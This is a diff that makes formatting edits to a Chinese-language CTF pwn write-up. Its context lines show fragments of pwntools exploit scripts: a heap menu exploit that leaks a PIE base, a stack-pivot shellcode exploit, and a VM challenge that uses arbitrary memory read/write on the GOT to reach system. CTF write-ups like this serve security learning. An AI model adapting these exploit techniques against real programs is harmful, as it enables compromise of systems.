@@ -9,7 +9,7 @@ tags: [writeup]
 ## Malloc
 
 ### 保护
-checksec, 发现是全保护.
+checksec, 发现是全保护。
 ```
 Arch:       amd64-64-little
 RELRO:      Full RELRO
@@ -253,21 +253,17 @@ sc = '''brva 0x18C9
 io = process(elf.path)
 # gdb.attach(io, sc)
 
-
 def cmd(c: int):
     io.sendlineafter(b'=======================', str(c).encode())
-
 
 def create(idx: int, size: int):
     cmd(1)
     io.sendlineafter(b'Index', str(idx).encode())
     io.sendlineafter(b'size', str(size).encode())
 
-
 def free(idx: int):
     cmd(2)
     io.sendlineafter(b'Index', str(idx).encode())
-
 
 def edit(idx: int, size: int, content: bytes):
     cmd(3)
@@ -275,18 +271,15 @@ def edit(idx: int, size: int, content: bytes):
     io.sendlineafter(b'size', str(size).encode())
     io.send(content)
 
-
 def show(idx: int):
     cmd(4)
     io.sendlineafter(b'Index', str(idx).encode())
-
 
 create(0, 0x10)
 create(1, 0x10)
 create(2, 0x10)
 create(3, 0x10)
 create(4, 0x10)
-
 
 free(4)
 free(3)
@@ -296,7 +289,6 @@ show(2)
 io.recvline()
 pie = u64(io.recvn(6).ljust(8, b'\x00')) - 0x5260
 success(f'pie: {hex(pie)}')
-
 
 create(16, 0x10)
 
@@ -480,11 +472,11 @@ signed __int64 bye()
   return sys_exit(0);
 }
 ```
-同样修了一下，能溢出3次，
+同样修了一下，能溢出 3 次，
 当然从伪代码看不出栈溢出
 实际上也是模拟，
 以下是 vuln 的部分汇编
-```
+```asm
 mov     rax, cs:buf2
 mov     rbp, rax
 mov     rsp, rbp
@@ -507,7 +499,6 @@ context.binary = elf = ELF('./xxxxx')
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 context.arch = 'amd64'
-
 
 scc = asm('''
     lea rsi, [rip]
@@ -610,7 +601,6 @@ io.send(payload)
 
 pause()
 io.send(b'a'*0xf)
-
 
 io.interactive()
 ```
@@ -1133,7 +1123,7 @@ void __noreturn sub_401239()
 ```
 Vm 题逆向最累了
 逆出了个大概
-看到了任意4字节地址读写
+看到了任意 4 字节地址读写
 
 ### EXP
 读出 got 表
@@ -1179,7 +1169,6 @@ def read_mem(addr:int):
     set_reg(0,0)
     op0(0x33,0,0,0)
 
-
 def write_mem(addr:int):
     set_reg(2,0x100)
     set_reg(1,addr)
@@ -1189,7 +1178,6 @@ def write_mem(addr:int):
 def system_123():
     set_reg(0, 0x4050A0)
     op0(0x33,0,0,1)
-
 
 write_mem(0x405020)
 read_mem(0x405028)
